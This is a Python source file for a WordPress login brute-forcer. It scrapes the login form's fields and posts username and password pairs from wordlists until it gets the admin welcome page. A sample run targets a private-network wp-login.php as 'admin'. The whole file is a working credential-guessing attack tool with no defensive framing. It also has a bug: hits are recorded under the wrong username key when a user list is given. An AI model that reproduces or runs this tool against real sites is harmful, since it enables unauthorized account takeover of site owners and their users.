from bs4 import BeautifulSoup
import requests
import time

from filehandler import read_list


class WordpressLogin:
    def __init__(self, target: str):
        self.target: str = target
        self.user = None
        self.password = None
        self.loot: dict = {}

    def _get_params(self, content: bytes) -> dict:
        """An internal function to fetch parameters

        This is an internal function which fetches both hidden av visible
        input fields from a given html text.

        args:
            content (bytes): web content from beautifulsoup in bytes

        returns:
            params (dict): A dict with input fields"""
        params = {}
        print(type(content))
        soup = BeautifulSoup(content, "html.parser")
        for param in soup.find_all("input"):
            name = param.get("name")
            if name is not None:
                params[name] = param.get("value", None)
        return params

    def login_brute(
        self,
        user: str | None = None,
        password: str | None = None,
        passlist: str | None = None,
        userlist: str | None = None,
    ):
        """Function to brute force wordpress logins

        This function can test multiple passwords and usernames combinations to log in
        to a wordpress admin site. For each provided username it iterates over provided passwords

        args:
            user (str|None): a single username
            password (str|None): A single password
            passlist (str|None): path to password list
            userlist (str|None): path to user list

        returns:
            dict | None: a dict of username and passwords, if error returns None"""
        loot = {}
        # create a list of given passwords + wordlist passwords
        passwords = []
        if password is not None:
            passwords.append(password)
        if passlist is not None:
            try:
                pwd = read_list(passlist)
                passwords.extend(pwd)
            except TypeError as e:
                print(f"could not add passlist: {e}")
        users = []
        if user != None:
            users.append(user)
        if userlist != None:
            try:
                usr = read_list(userlist)
                users.extend(usr)
            except TypeError as e:
                print(f"Could not add userlist: {e}")

        s = requests.Session()
        try:
            login_page = s.get(self.target)
            login_page.raise_for_status()
        except requests.exceptions.HTTPError as e:
            print(f"Could not retrieve login site: {e}")
            return
        params = self._get_params(login_page.content)
        for u in users:
            params["log"] = u
            for p in passwords:
                params["pwd"] = p
                t = s.post(self.target, data=params)
                if "Welcome to WordPress!" in t.text:
                    self.loot[user] = p
                    loot[user] = p
                    break
        return loot


if __name__ == "__main__":
    test = WordpressLogin(target="http://10.1.1.39:8080/wp-login.php")
    test.login_brute(user="admin", passlist="wordlist/test.txt")
